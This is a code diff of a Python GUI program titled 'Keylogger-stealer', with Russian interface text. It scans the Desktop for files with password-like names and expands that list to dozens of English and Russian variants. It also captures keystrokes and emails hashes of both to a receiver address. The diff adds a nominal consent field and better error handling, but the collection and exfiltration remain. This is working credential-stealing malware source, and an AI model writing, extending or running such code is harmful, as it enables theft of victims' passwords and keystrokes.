@@ -15,8 +15,9 @@ def send_email(subject, content, sender_email, password, receiver_email):
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message)
         server.quit()
+        return True
     except:
-        pass
+        return False
 
 # Функция для хэширования строки по алгоритму MD5
 def hash_string(string):
@@ -26,7 +27,13 @@ def hash_string(string):
 # Функция для обработки файлов на рабочем столе
 def process_files(sender_email, password, receiver_email):
     desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-    files_to_search = ['pass.txt', 'password.txt', 'passwords.txt', 'пароли.txt']
+    files_to_search = ['pass.txt', 'password.txt', 'passwords.txt', 'пароли.txt',
+                       'password_list.txt', 'passwd.txt', 'credentials.txt', 'logins.txt',
+                       'accounts.txt', 'key.txt', 'keys.txt', 'usernames.txt',
+                       'secret.txt', 'login.txt', 'pass_list.txt', 'credentials_list.txt',
+                       'password_storage.txt', 'access.txt', 'доступ.txt', 'пароли_и_логины.txt',
+                       'список_паролей.txt', 'учетные_данные.txt', 'логины_и_пароли.txt',
+                       'секреты.txt', 'коды_доступа.txt', 'ключи_для_входа.txt', 'конфиденциальные_данные.txt']
 
     for file_name in files_to_search:
         file_path = os.path.join(desktop_path, file_name)
@@ -36,7 +43,10 @@ def process_files(sender_email, password, receiver_email):
                     hashed_line = hash_string(line.strip())
                     email_subject = 'EHP'
                     email_content = f'EHP password {hashed_line}'
-                    send_email(email_subject, email_content, sender_email, password, receiver_email)
+                    success = send_email(email_subject, email_content, sender_email, password, receiver_email)
+                    if not success:
+                        messagebox.showerror('Ошибка', 'Не удалось отправить данные на почту.')
+                        return
 
     messagebox.showinfo('Успех', 'Поиск файлов с паролями завершен.')
 
@@ -60,15 +70,17 @@ def process_key_presses(sender_email, password, receiver_email):
     hashed_combination = hash_string(key_combination.strip())
     email_subject = 'EHP'
     email_content = f'EHP keylog {hashed_combination}'
-    send_email(email_subject, email_content, sender_email, password, receiver_email)
+    success = send_email(email_subject, email_content, sender_email, password, receiver_email)
+    if not success:
+        messagebox.showerror('Ошибка', 'Не удалось отправить данные на почту.')
 
     return key_combination
 
 # Функция для создания окна с вводом данных
 def create_window():
     window = Tk()
-    window.title('Этичный Кейлоггер-стилер')
-    window.geometry('300x200')
+    window.title('Кейлоггер-стилер')
+    window.geometry('300x300')
 
     label_email = Label(window, text='Email:')
     label_email.pack()
@@ -94,35 +106,80 @@ def create_window():
     entry_master_key = Entry(window, show='*')
     entry_master_key.pack()
 
+    label_consent = Label(window, text='Согласие (Да/Нет):')
+    label_consent.pack()
+
+    entry_consent = Entry(window)
+    entry_consent.pack()
+
+    def check_fields(email, password, receiver_email, master_key, consent):
+        if not email or not password or not receiver_email or not master_key or not consent:
+            messagebox.showerror('Ошибка', 'Пожалуйста, заполните все поля.')
+            return False
+
+        if consent.lower() not in ['да', 'нет']:
+            messagebox.showerror('Ошибка', 'Неверный формат согласия. Введите "Да" или "Нет".')
+            return False
+
+        if master_key != 'EHP':
+            messagebox.showerror('Ошибка', 'Неправильный мастер-ключ.')
+            return False
+
+        return True
+
+    def get_consent():
+        consent = entry_consent.get()
+        if not consent:
+            messagebox.showerror('Ошибка', 'Пожалуйста, введите согласие.')
+            return None
+        return consent
+
     def start_search():
         email = entry_email.get()
         password = entry_password.get()
         receiver_email = entry_receiver_email.get()
         master_key = entry_master_key.get()
+        consent = get_consent()
 
-        if master_key == 'EHP':
-            process_files(email, password, receiver_email)
+        if check_fields(email, password, receiver_email, master_key, consent):
+            if consent.lower() == 'да':
+                process_files(email, password, receiver_email)
 
+            else:
+                messagebox.showinfo('Уведомление', 'Согласие не было получено. Программа не будет работать.')
     def start_keylogger():
         email = entry_email.get()
         password = entry_password.get()
         receiver_email = entry_receiver_email.get()
         master_key = entry_master_key.get()
+        consent = get_consent()
 
-        if master_key == 'EHP':
-            button_keylogger.config(state=DISABLED)
-            messagebox.showinfo('Уведомление', 'Кейлоггер запущен. Считывание клавиш продолжится в течение 10 секунд.')
+        if check_fields(email, password, receiver_email, master_key, consent):
+            if consent.lower() == 'да':
+                button_keylogger.config(state=DISABLED)
+                messagebox.showinfo('Уведомление', 'Кейлоггер запущен. Считывание клавиш продолжится в течение 10 секунд.')
 
-            key_combination = process_key_presses(email, password, receiver_email)
+                key_combination = process_key_presses(email, password, receiver_email)
 
-            messagebox.showinfo('Успех', f'Считанная комбинация клавиш: {key_combination}')
-            button_keylogger.config(state=NORMAL)
+                messagebox.showinfo('Успех', f'Считанная комбинация клавиш: {key_combination}')
+                button_keylogger.config(state=NORMAL)
+            else:
+                messagebox.showinfo('Уведомление', 'Согласие не было получено. Программа не будет работать.')
 
     button_search = Button(window, text='Начать поиск файлов с паролями', command=start_search)
     button_search.pack()
 
     button_keylogger = Button(window, text='Запустить кейлоггер', command=start_keylogger)
     button_keylogger.pack()
+
+    # Копирование пароля из буфера обмена
+    def paste_password():
+        password = window.clipboard_get()
+        entry_password.delete(0, 'end')
+        entry_password.insert(0, password)
+
+    button_paste = Button(window, text='Вставить пароль из буфера обмена', command=paste_password)
+    button_paste.pack()
 
     window.mainloop()
 
